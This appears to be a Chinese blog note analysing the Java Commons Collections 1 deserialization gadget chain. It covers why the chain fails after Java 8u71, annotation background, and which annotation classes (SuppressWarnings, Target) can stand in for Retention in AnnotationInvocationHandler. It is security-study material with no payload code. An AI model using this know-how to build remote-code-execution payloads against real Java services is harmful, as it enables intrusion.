为什么Java高版本无法利用？

这个poc的测试是在Java 8u71之前的版本上，在8u71以后，Java官方修改了sun.reflect.annotation.AnnotationInvocationHandler的readObject函数

对于这次修改，改动后，不再直接使用反序列后得到的Map对象，而是新建了一个LinkedHashMap对象，并将原来的键值添加进去。
后续对Map的操作也都基于这个新的LinkedHashMap对象，这样就不会触发攻击者精心构造的Map的set或者put操作，也就不会触发RCE了。

如果查看ysoserial的代码，会发现它没有用到demo的TransformedMap，而是改用了LazyMap。
但是这并不能直接解决无法在高版本Java中无法使用CC1这条利用链的问题，主要问题还是出现在
sun.reflect.annotation.AnnotationInvocationHandler这个类的修改上。

如何让var7不为null

下面的分析及到注解的知识
Annotation(注解)是java1.5中引入的机制
java中的类，方法，变量，参数和包等都可以被标注。java虚拟机可以保留标注内容
关于注解的学习，推荐看这一篇文章 https://www.runoob.com/w3cnote/java-annotation.html
元注解：
作用于注解的注解，比如@Retention和@Target还有@Documented就是三个元注解
他们用于标识一个注解的RetentionPolicy属性和ElementType属性还有注解是否出现在javadoc中
Target元注解和ElementType枚举类是配合使用的
对于ElementType枚举类

这个枚举类型的常量提供了对Java程序中注释可能出现的语法位置的简单分类。这些常量在 Target 元注解中用于指定在什么地方写给定类型的注解是合法的。
注释可能出现的语法位置分为声明上下文（声明上下文中的注解适用于声明）和类型上下文（类型上下文中的注解适用于声明和表达式中使用的类型）。
例如，一个类型为@Target(ElementType.FIELD)的元注解只能被写成字段声明的修饰符。
一个类型为@Target(ElementType.METHOD)的元注解只能被写成方法声明的修饰符。

Retention元注解和RetentionPolicy枚举类也是配合使用的
对于RetentionPolicy枚举类

注释保留政策。这个枚举类型的常量描述了保留注解的各种策略，它们与保留元注解类型(Retention)一起使用，指定注解的保留时间。它们与保留元注解类型一起使用，指定注解的保留时间。

SOURCE     /* Annotation信息仅存在于编译器处理期间，编译器处理完之后就没有该Annotation信息了  */

CLASS     /* 编译器将Annotation存储于类对应的.class文件中。默认行为  */

RUNTIME  /* 编译器将Annotation存储于class文件中，并且可由JVM读入 */

注解有以下特性：

  1. 一个Annotation(java注解)和一个RetentionPolicy关联，也就是说对每个Annotation对象，有唯一的RetentionPolicy属性
  2. 一个Annotation(java注解)和一个或多个ElementType关联,也就是说对每个Annotation对象，有若干个ElementType属性
  3. Annotation接口有许多实现类，包括Deprecated，Documented，Override等等
    可以像这样定义一个注解 这个注解可以这么用 更多的相关知识真的推荐看上面的链接，讲得非常详细。

替换Retention

经过上面的分析，结合AnnotationInvocationHandler的构造函数，构造函数要求的第一个参数是(Class<? extends Annotation>)。
也就是说继承了Annotation的类其实都可以作为参数传给AnnotationInvocationHandler。
Java1.7中一共内置了7个注解，三个在java.lang中
Override
Deprecated
SuppressWarnings
其他四个在java.lang.annotation中
Retention
Documented
Target
Inherited
使用ctrl+shift+alt+n，逐个搜索这些注解，即可知道哪些注解可用

这里给出另外两个可用的类
SuppressWarnings
Target
这两个类也都是只有value一个方法。可以用
SuppressWarnings.class
Target.class
